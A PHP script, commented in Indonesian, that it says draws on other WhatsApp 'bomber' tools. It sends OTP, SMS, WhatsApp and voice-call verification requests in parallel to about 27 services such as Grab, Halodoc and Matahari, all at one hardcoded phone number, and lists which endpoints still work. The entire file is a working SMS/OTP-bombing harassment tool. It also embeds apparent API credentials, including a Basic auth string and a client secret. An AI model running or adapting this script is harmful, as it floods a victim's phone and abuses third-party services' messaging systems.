<?php
// Probe kandidat endpoint OTP (diambil dari source tool bom WA lain: MySPAMBot-OTP, Spam-Wa, otp-bomber)
// Placeholder: {P}=6283822461998  {L}=083822461998  {N}=83822461998  {D}=uuid  {R}=random 6 digit

$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$D = trim((string) @file_get_contents('/home/runner/bom/.device-id'));

$EPS = [
  ['duniagames', 'POST', 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
   ['Accept: application/json, text/plain, */*', 'Content-Type: application/json', 'Origin: https://duniagames.co.id', 'Referer: https://duniagames.co.id/', 'Ciam-Type: FR', 'x-device: {D}'],
   '{"phoneNumber":"+{P}","userName":"{L}"}'],

  ['ktbs', 'GET', 'https://core.ktbs.io/v2/user/registration/otp/{N}', [], ''],

  ['klikwa', 'POST', 'https://api.klikwa.net/v1/number/sendotp',
   ['Authorization: Basic QjMzOkZSMzM=', 'Content-Type: application/json'], '{"number":"+{P}"}'],

  ['payfazz', 'POST', 'https://api.payfazz.com/v2/phoneVerifications',
   ['Accept: */*', 'Origin: https://www.payfazz.com', 'Referer: http://www.payfazz.com/register/', 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'], 'phone={L}'],

  ['battlefront', 'POST', 'https://battlefront.danacepat.com/v1/auth/common/phone/send-code',
   ['Content-Type: application/x-www-form-urlencoded'], 'mobile_no={N}'],

  ['asani', 'POST', 'https://api.asani.co.id/api/v1/send-otp',
   ['Content-Type: application/json'], '{"phone":"{P}","email":"akuntes{R}@gmail.com"}'],

  ['jumpstart', 'POST', 'https://api.jumpstart.id/graphql',
   ['Content-Type: application/json'], '{"operationName":"CheckPhoneNoAndGenerateOtpIfNotExist","variables":{"phoneNo":"+{P}"},"query":"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"}'],

  ['depop', 'PUT', 'https://webapi.depop.com/api/auth/v1/verify/phone',
   ['Accept: application/json, text/plain, */*', 'Content-Type: application/json'], '{"phone_number":"{P}","country_code":"ID"}'],

  ['matahari', 'POST', 'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
   ['Content-Type: application/json', 'Accept: */*', 'X-Requested-With: XMLHttpRequest', 'Origin: https://www.matahari.com', 'Referer: https://www.matahari.com/customer/account/create/'],
   '{"otp_request":{"mobile_number":"{N}","mobile_country_code":"+62"}}'],

  ['mapclub', 'POST', 'https://cmsapi.mapclub.com/api/signup-otp',
   ['Content-Type: application/x-www-form-urlencoded'], 'phone={L}'],

  ['mapclub2', 'POST', 'https://beryllium.mapclub.com/api/member/registration/sms/otp',
   ['Content-Type: application/json', 'Accept: application/json, text/plain, */*', 'Origin: https://www.mapclub.com', 'Referer: https://www.mapclub.com/'], '{"account":"{N}"}'],

  ['bukuwarung', 'POST', 'https://api-v2.bukuwarung.com/api/v2/auth/otp/send',
   ['Content-Type: application/json', 'Accept: application/json, text/plain, */*', 'x-app-version-name: android', 'x-app-version-code: 3001', 'buku-origin: tokoko-web', 'Origin: https://tokoko.id', 'Referer: https://tokoko.id/'],
   '{"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-{R}","method":"WA","phone":"{P}","clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"}'],

  ['cairin', 'POST', 'https://app.cairin.id/v1/app/sms/sendCaptcha',
   ['Content-Type: application/x-www-form-urlencoded'], 'haveImageCode=0&fileName=6f8c3b90c845f09ff1bfe714a30aede8&phone={P}&imageCode=&userImei=&type=registry'],

  ['sampingan', 'POST', 'https://srv3.sampingan.co.id/auth/generate-otp',
   ['Content-Type: application/json'], '{"countryCode":"+62","phoneNumber":"{N}"}'],

  ['sooplai', 'POST', 'https://api.sooplai.com/customer/register/otp/request',
   ['Accept: application/json, text/plain, */*', 'Content-Type: application/json', 'Origin: https://www.sooplai.com', 'Referer: https://www.sooplai.com/register'], '{"phone":"{P}"}'],

  ['grabtaxi', 'POST', 'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
   ['Content-Type: application/x-www-form-urlencoded'], 'phoneNumber={P}&countryCode=ID&name=bom&email=bom%40mail.com&deviceToken=*'],

  ['grabid', 'POST', 'https://api.grab.com/grabid/v1/phone/otp',
   ['Content-Type: application/x-www-form-urlencoded'], 'method=CALL&countryCode=id&phoneNumber={P}&templateID=pax_android_production'],

  ['klikindomaret', 'GET', 'https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={P}',
   ['Accept: */*', 'Origin: https://account.klikindomaret.com', 'Referer: https://account.klikindomaret.com/'], ''],

  ['phd', 'POST', 'https://www.phd.co.id/en/users/sendOTP',
   ['Content-Type: application/x-www-form-urlencoded'], 'user%5Bphone%5D={P}&user%5Bcountry%5D=62'],

  ['altbalaji', 'POST', 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID',
   ['Content-Type: application/json', 'Origin: https://lite.altbalaji.com', 'Referer: https://lite.altbalaji.com/subscribe'], '{"phone":"{P}","recaptcha":""}'],

  ['tokotalk', 'POST', 'https://api.tokotalk.com/v1/no_auth/verifications',
   ['Content-Type: application/json'], '{"phone":"{L}"}'],

  ['gokwik', 'POST', 'https://gkx.gokwik.co/v4/auth/otp/login/trigger',
   ['Content-Type: application/json', 'Origin: https://pdp.gokwik.co', 'Referer: https://pdp.gokwik.co/'], '{"mobileNumber":"{N}","countryCode":"+62"}'],

  ['redbus', 'GET', 'https://m.redbus.id/api/getOtp?number={N}&cc=62&whatsAppOpted=True', [], ''],

  ['rupiahcepat', 'POST', 'https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code',
   ['Content-Type: application/x-www-form-urlencoded; charset=UTF-8', 'Origin: https://h5.rupiahcepatweb.com', 'Referer: https://h5.rupiahcepatweb.com/'],
   'data=%7B%22mobile%22%3A%22{L}%22%2C%22noise%22%3A%221583590641573155574%22%2C%22request_time%22%3A%22158359064157312%22%2C%22access_token%22%3A%2211111%22%7D'],

  ['halodoc', 'GET', 'https://www.halodoc.com/otp/api?phoneNumber={P}&purpose=register', ['Accept: application/json'], ''],

  ['carsome', 'POST', 'https://www.carsome.id/api/v1/auth/otp', ['Content-Type: application/json', 'Accept: application/json'], '{"phone":"{L}"}'],

  ['sayurbox', 'POST', 'https://sayurbox-restapi.azure-api.net/api/v3/users/register-otp',
   ['Content-Type: application/json', 'Accept: application/json'], '{"phone":"{L}"}'],

  ['icq', 'POST', 'https://u.icq.net/api/v14/rapi/auth/sendCode',
   ['Accept: */*', 'Content-Type: application/json', 'Origin: http://web.icq.com', 'Referer: http://web.icq.com/'],
   '{"reqId":"6470{R}-1593781791","params":{"phone":"+{P}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}'],
];

function build($e, $D) {
    $N = '83822461998'; $P = '6283822461998'; $L = '083822461998';
    $R = (string) random_int(100000, 999999);
    $repl = ['{P}' => $P, '{L}' => $L, '{N}' => $N, '{D}' => $D, '{R}' => $R];
    $hdrs = [];
    foreach ($e[3] as $h) { $hdrs[] = strtr($h, $repl); }
    global $UA;
    $hdrs[] = 'User-Agent: ' . $UA;
    return [strtr($e[2], $repl), $hdrs, strtr($e[4], $repl)];
}

$mh = curl_multi_init();
$cs = [];
foreach ($EPS as $i => $e) {
    [$url, $hdrs, $body] = build($e, $D);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url, CURLOPT_HTTPHEADER => $hdrs, CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 8, CURLOPT_TIMEOUT => 20, CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_CUSTOMREQUEST => $e[1],
    ]);
    if ($e[1] !== 'GET') { curl_setopt($ch, CURLOPT_POSTFIELDS, $body); }
    curl_multi_add_handle($mh, $ch);
    $cs[$i] = $ch;
}

$running = null; $errs = [];
do {
    curl_multi_exec($mh, $running);
    while (($info = curl_multi_info_read($mh)) !== false) {
        $idx = array_search($info['handle'], $cs, true);
        if ($info['result'] !== CURLE_OK) { $errs[$idx] = curl_strerror($info['result']); }
    }
    curl_multi_select($mh, 1.0);
} while ($running > 0);

$ok = []; $dead = [];
printf("%-14s %-5s %-6s %-6s %s\n", 'ENDPOINT', 'HTTP', 'CF', 'KB', 'CATATAN');
echo str_repeat('-', 100) . "\n";
foreach ($EPS as $i => $e) {
    $ch = $cs[$i];
    $body = (string) curl_multi_getcontent($ch);
    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $cf = (stripos($body, 'Just a moment') !== false || stripos($body, 'Attention Required') !== false) ? 'YA' : '-';
    $note = trim(preg_replace('/\s+/', ' ', substr($body, 0, 88)));
    if (isset($errs[$i])) { $note = 'GAGAL: ' . $errs[$i]; $dead[] = $e[0]; }
    elseif ($cf === 'YA') { $note = '(cloudflare challenge)'; $dead[] = $e[0]; }
    elseif ($code >= 200 && $code < 400) { $note = '=> HIDUP: ' . ($note ?: '(body kosong)'); $ok[] = $e[0]; }
    else { $note = $note !== '' ? $note : '(body kosong)'; $dead[] = $e[0]; }
    printf("%-14s %-5s %-6s %-6s %s\n", $e[0], $code ?: '000', $cf, round(strlen($body) / 1024, 1), $note);
    curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);
echo "\nHIDUP (" . count($ok) . "): " . implode(', ', $ok) . "\n";
echo "MATI/BLOKIR (" . count($dead) . "): " . implode(', ', $dead) . "\n";
